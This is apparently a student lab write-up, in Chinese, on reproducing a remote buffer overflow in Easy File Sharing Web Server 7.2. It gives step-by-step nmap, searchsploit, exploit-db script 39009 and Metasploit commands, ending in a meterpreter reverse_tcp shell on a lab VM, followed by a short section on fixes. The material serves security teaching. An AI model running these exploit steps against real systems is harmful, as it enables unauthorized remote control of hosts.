# Easy File Sharing Web Server 远程溢出漏洞复现

> 对应课程：漏洞扫描与测试模块 + 课本 P170 7.4
> 目标软件：Easy File Sharing Web Server 7.2（HTTP 服务，存在远程缓冲区溢出漏洞）

## 0. 实验环境

| 角色  | 系统                | 说明                                           |
| --- | ----------------- | -------------------------------------------- |
| 攻击机 | Kali Linux        | 运行 nmap / searchsploit / MSF / Python 脚本     |
| 靶机  | Windows 10 x64虚拟机 | 安装 Easy File Sharing Web Server 7.2，开放 80 端口 |

靶机 Easy File Sharing Web Server 启动界面如下：

![](E:\实验报告撰写\Easy%20File%20Sharing\images\01-start.png)

可以通过 IP 地址远程访问

![](E:\实验报告撰写\Easy%20File%20Sharing\images\02-remote.png)

---

## 1. 信息收集：Nmap 扫描目标

先对靶机做端口扫描，确认目标在线并识别开放服务：

```bash
nmap -sV 192.168.169.131
```

`-sV` 用于探测服务版本。扫描结果中可看到 80 端口开放，服务指纹为 Easy File Sharing HTTP Server：

```
80/tcp open http Easy File Sharing HTTP Server 7.2
```

![](E:\实验报告撰写\Easy%20File%20Sharing\images\03-nmap.png)

> 说明：nmap 是靠收集服务返回的特征（HTTP 响应头、banner、特定字符串等）来匹配自带的指纹库（`nmap-service-probes`），而Easy File Sharing 从 6.9 到 7.2 的网络响应特征几乎没变，指纹库里这条特征标注的是 6.9，于是就匹配成了 6.9，真实版本号以软件 About 界面为准

![](E:\实验报告撰写\Easy%20File%20Sharing\images\04-version.png)

---

## 2.1 漏洞查找：searchsploit

Kali 自带 exploit-db 漏洞库，使用 `searchsploit` 按软件名查找可用的渗透模块：

```bash
searchsploit Easy File Sharing
```

![](E:\实验报告撰写\Easy%20File%20Sharing\images\05-searchsploit.png)

输出结果中包含针对该软件的多个 exploit，例如 HTTP 服务的 SEH 溢出、FTP 服务的 PASS 溢出等：

```
Easy File Sharing FTP Server 2.0 (Windows 2000 SP4) - 'PASS' Remote Overflow 
Easy File Sharing Web Server 7.2 - GET 'PassWD' Remote Buffer Overflow (SEH) 
```

这里介绍一个网站，可以在线查找漏洞，和 Kali 里的 `searchsploit`数据同源。

> 在线漏洞库地址：https://www.exploit-db.com

![](E:\实验报告撰写\Easy%20File%20Sharing\images\11-exploit_db.png)

可以在线查看漏洞的 EDB 编号和脚本内容。

### 2.2 searchsploit 中多个 exploit 的区别

searchsploit 列出了大量针对 7.2 的脚本，它们的区别体现在三个维度：触发点、利用技术、攻击范围。

**（1）触发点不同**：软件有多个输入字段都未做长度检查，每个可溢出的入口对应一个独立 exploit。

| 触发点                       | 说明               |
| ------------------------- | ---------------- |
| GET                       | 从 URL 的 GET 请求触发 |
| POST                      | 从 POST 提交数据触发    |
| HEAD                      | 从 HTTP HEAD 方法触发 |
| UserID / PassWD           | 从用户 ID、密码修改字段触发  |
| New User / Account Import | 从注册新用户、账户导入功能触发  |

**（2）利用技术不同**：针对不同防护和缓冲区大小采用不同手法。

| 技术                    | 作用                             |
| --------------------- | ------------------------------ |
| SEH                   | 覆盖结构化异常处理，借异常机制劫持执行流           |
| DEP Bypass + ROP      | 用 ROP gadgets 绕过数据执行保护（DEP）    |
| Egghunter             | 缓冲区过小时，用小段代码在内存中搜索完整 shellcode |
| Stack Buffer Overflow | 直接覆盖栈返回地址                      |

**（3）攻击范围与脚本类型不同**：

| 维度   | 分类                                              |
| ---- | ----------------------------------------------- |
| 攻击范围 | remote（远程网络发包，本文采用）/ local（需已在本机操作，多用于提权）       |
| 脚本类型 | .py（Python 手动利用）/ .rb（Metasploit 模块）/ .txt（说明类） |

本文只复现其中一条远程 SEH 利用线（Python 39009，HEAD请求触发）与一个 MSF 模块，其余脚本原理相通，无需逐一复现。

---

## 3. 攻击方式一：Python 脚本利用

searchsploit 找到的 Python exploit 本质是向目标 HTTP 服务发送精心构造的超长请求，触发缓冲区溢出。

### 3.1 查看脚本参数

```bash
cat /usr/share/exploitdb/exploits/windows/remote/39009.py
```

脚本头部一般标注了用法、目标版本和需要填写的回连地址与端口。如：

```python
# Exploit Title: Easy File Sharing Web Server 7.2 - HEAD HTTP request SEH Buffer Overflow
# Date: 12/2/2015
# Exploit Author: ArminCyber
# Contact: Armin.Exploit@gmail.com
# Version: 7.2
# Tested on: XP SP3 EN
# category: Remote Exploit
# Usage: ./exploit.py ip port
```

> 说明：该脚本是用 **shikata_ga_nai** 编码的 `windows/exec CMD=calc.exe` shellcode，若靶机上弹出 Windows 计算器，证明漏洞利用成功。

### 3.2 执行攻击脚本

按照注释要求，传入靶机IP地址和服务端口

```bash
python2 /usr/share/exploitdb/exploits/windows/remote/39009.py 192.168.10.131 80
```

> 注意：部分老脚本基于 Python 2 编写，需用 `python2` 执行；若系统无 python2，可用 `python3` 版本的同类 exploit 或做语法适配。

![](E:\实验报告撰写\Easy%20File%20Sharing\images\06-python-done.png)

![](E:\实验报告撰写\Easy%20File%20Sharing\images\15-calc.png)

在靶机上弹出计算器，说明攻击成功。

---

## 4. 攻击方式二：Metasploit 利用

使用 MSF 内置的 `easyfilesharing_seh` 模块，通过 SEH 覆盖触发溢出，配合 reverse_tcp 载荷拿到 meterpreter。

### 4.1 启动 MSF 并查找模块

```bash
msfconsole
search EasyFileSharing
```

![](E:\实验报告撰写\Easy%20File%20Sharing\images\07-msf_start.png)

![](E:\实验报告撰写\Easy%20File%20Sharing\images\08-msf_search.png)

### 4.2 加载模块

```
use exploit/windows/http/easyfilesharing_seh
```

### 4.3 查看需要配置的参数

```
show options
```

![](E:\实验报告撰写\Easy%20File%20Sharing\images\12-show_options.png)

### 4.4 设置攻击载荷

```
set payload windows/meterpreter/reverse_tcp
```

### 4.5 填写参数

```
set RHOST 192.168.10.131    # 靶机 IP
set RPORT 80                 # 目标 HTTP 端口
set LHOST 192.168.10.129    # 攻击机 IP（回连地址）
set LPORT 4444               # 回连端口
```

![](E:\实验报告撰写\Easy%20File%20Sharing\images\09-msf_set.png)

### 4.6 确认参数后执行

```
exploit
```

成功后输出：

```
[*] Started reverse TCP handler on 192.168.169.130:4444
[*] 192.168.169.131:80 - Sending exploit...
[+] Exploit Sent
[*] Sending stage (957487 bytes) to 192.168.169.131
[*] Meterpreter session 1 opened
meterpreter >
```

![](E:\实验报告撰写\Easy%20File%20Sharing\images\10-msf_success.png)

### 4.7 验证控制权限

进入 meterpreter 后执行：

```
sysinfo
getuid
```

可查看目标系统信息和当前权限，确认已实现远程控制。

![](E:\实验报告撰写\Easy%20File%20Sharing\images\14-uid.png)

---

## 5. 原理

```
nmap 识别服务版本
      ↓
searchsploit 匹配已知漏洞
      ↓
缓冲区溢出（SEH 覆盖）劫持执行流
      ↓
payload 反弹连接 → 拿到 shell / meterpreter
```

- **漏洞根因**：Easy File Sharing Web Server 对用户输入长度缺少边界检查，超长请求触发缓冲区溢出。
- **SEH 覆盖**：通过覆盖结构化异常处理（SEH）记录，劫持程序异常处理流程，跳转到恶意 shellcode。
- **reverse_tcp**：靶机主动回连攻击机，可绕过目标对入站连接的限制。

## 6. 修复建议

1. 停止使用该老旧版本，升级到官方最新版或更换同类软件。
2. 对服务端口做访问控制，仅允许可信主机访问。
3. 主机部署防火墙规则，限制 80 端口的外部连接。
4. 及时安装系统补丁，关闭不必要的服务。

---
